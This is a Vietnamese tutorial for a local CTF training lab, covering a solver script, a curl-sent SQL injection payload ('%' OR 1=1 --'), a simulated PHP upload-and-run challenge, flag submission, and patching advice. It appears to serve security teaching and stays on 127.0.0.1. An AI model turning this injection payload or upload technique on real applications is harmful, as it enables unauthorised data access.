# Phần 3 — Hiểu và giải lab FCTF cục bộ

Tài liệu này đi cùng script [solve_local_lab.py](scripts/solve_local_lab.py). Nó áp dụng riêng cho ứng dụng huấn luyện FCTF Vault chạy trên loopback trong project workspace. Không nhập URL mục tiêu tùy ý vào script, không đổi host thành server thực tế, và không dùng các ví dụ để kiểm thử hệ thống ngoài lab.

## 1. Khởi động lab

Trong thư mục project có file server.py, mở terminal và chạy:

~~~sh
python3 server.py
~~~

Lab bind vào 127.0.0.1:8000. Mở trình duyệt tại http://127.0.0.1:8000 để xem dashboard. Flag và scoreboard chỉ tồn tại trong bộ nhớ process; khởi động lại server sẽ sinh flag mới và reset điểm.

Nếu cổng 8000 đang dùng, có thể khởi động server bằng cổng riêng:

~~~sh
FCTF_PORT=8001 python3 server.py
~~~

## 2. Luồng SQL injection trong lab

Endpoint thử nghiệm là GET /lab/team/2/sqli/search?q=.... Trong source của lab, giá trị q cố ý được nối vào câu SQL để tạo bài tập; dữ liệu chỉ là SQLite trong bộ nhớ, gồm ghi chú giả và flag. Đầu ra là JSON có danh sách rows. Bài giải đọc flag từ response rồi gửi đúng flag tới scoreboard.

### Gửi request thủ công

~~~sh
curl --get --data-urlencode "q=%' OR 1=1 --" \
  http://127.0.0.1:8000/lab/team/2/sqli/search
~~~

Đọc trường body của JSON response và tìm chuỗi dạng FCTF{...}. Chỉ flag của Team 2 trong process hiện tại mới được scoreboard chấp nhận.

### Gửi flag thủ công

Thay FLAG_HERE bằng flag vừa đọc từ response:

~~~sh
curl -X POST http://127.0.0.1:8000/api/submit \
  -H 'Content-Type: application/json' \
  -d '{"teamId":1,"targetTeamId":2,"challengeId":"sqli","flag":"FLAG_HERE"}'
~~~

Kết quả accepted=true nghĩa là scoreboard nhận flag. Nếu gửi lại cùng challenge, kết quả duplicate=true và không cộng điểm thêm.

## 3. Luồng upload giả lập

Endpoint POST /lab/team/2/upload nhận multipart field tên file. Lab chỉ giữ bytes trong bộ nhớ. Sau upload, endpoint GET /lab/team/2/upload/run?filename=...&action=read_flag trả flag nếu tên file có đuôi PHP được hỗ trợ và action đúng.

Trong bài tập này file PHP-looking là artifact giả; server không thực thi PHP, không chạy lệnh hệ thống và không ghi file lên đĩa. Đây là mô hình an toàn để hiểu sự khác nhau giữa upload và thực thi thật.

### Upload thủ công bằng curl

~~~sh
printf '%s\n' '<?php /* inert local training artifact */ ?>' > /tmp/fctf-proof.php
curl -F 'file=@/tmp/fctf-proof.php' \
  http://127.0.0.1:8000/lab/team/2/upload
~~~

Response JSON chứa tên file đã nhận. Gọi action giả lập:

~~~sh
curl --get \
  --data-urlencode 'filename=fctf-proof.php' \
  --data-urlencode 'action=read_flag' \
  http://127.0.0.1:8000/lab/team/2/upload/run
~~~

Đọc flag từ response rồi submit với challengeId là upload.

## 4. Chạy solver tự động

Mở terminal thứ hai, từ thư mục workspace chạy:

~~~sh
python3 web-security-cheatsheet/scripts/solve_local_lab.py
~~~

Nếu server dùng cổng khác:

~~~sh
python3 web-security-cheatsheet/scripts/solve_local_lab.py --port 8001
~~~

Script thực hiện theo thứ tự:

1. Gọi health endpoint trên 127.0.0.1 và xác nhận service là Vault Service của lab.
2. Gửi request bài SQLi, trích flag từ JSON.
3. Gửi multipart artifact vô hại; gọi action read_flag giả lập.
4. Gửi mỗi flag tới POST /api/submit trên cùng loopback port.
5. In kết quả được nhận, bị từ chối hoặc bị trùng.

Script dùng host cố định 127.0.0.1 và các route cố định của lab. Nó không đọc proxy environment, không theo redirect, không nhận URL/endpoint submit từ file cấu hình và không gọi server ngoài máy. Đây là ràng buộc có chủ ý.

## 5. Cách hiểu kết quả

- **accepted=true, points=100:** flag đúng và challenge đó được tính điểm.
- **duplicate=true, points=0:** flag đã được ghi nhận trước đó trong process scoreboard.
- **invalid flag:** kiểm tra flag lấy từ đúng Team 2 và đúng lần khởi chạy hiện tại; restart làm flag đổi.
- **Cannot reach the FCTF lab:** server chưa chạy, sai port hoặc lab không trả health response như mong đợi.
- **SQLi không có flag:** kiểm tra endpoint/query của lab; không thay đổi script thành URL mục tiêu bên ngoài.
- **Upload action không trả flag:** kiểm tra response upload, filename và action; artifact chỉ được mô phỏng, không được thực thi.

## 6. Học cách vá sau khi giải

Challenge được cố ý làm yếu để người học quan sát lỗi. Không mang pattern đó sang ứng dụng thật.

- SQL: thay nối chuỗi query bằng parameterized statement; xem ví dụ và giải thích trong [Phần 2](02-patching-source-nginx-apache.md#21-sql-injection-và-query-động).
- Upload: allowlist loại file, sinh tên do ứng dụng kiểm soát, lưu ngoài webroot, kiểm tra quyền download và không thực thi nội dung tải lên.
- Thêm regression test: query vẫn trả kết quả hợp lệ, input được coi là dữ liệu; file giả/không hợp lệ bị chặn; user khác không lấy được tài nguyên; scoreboard không nhận flag sai.
- Dùng ZAP passive scan để phát hiện một số header/cookie/config issue; ZAP không thay kiểm tra quyền và business logic.

## 7. API lab tham khảo

| Method | Route | Mục đích |
|---|---|---|
| GET | /lab/team/2/health | Xác nhận service local |
| GET | /lab/team/2/sqli/search?q=... | Challenge SQLi có chủ đích |
| POST | /lab/team/2/upload | Nhận artifact giả qua multipart field file |
| GET | /lab/team/2/upload/run?filename=...&action=read_flag | Mô phỏng action đọc flag |
| POST | /api/submit | Nộp flag vào scoreboard cục bộ |

Server hiện chỉ bind loopback; không cấu hình bind ra LAN/Internet.
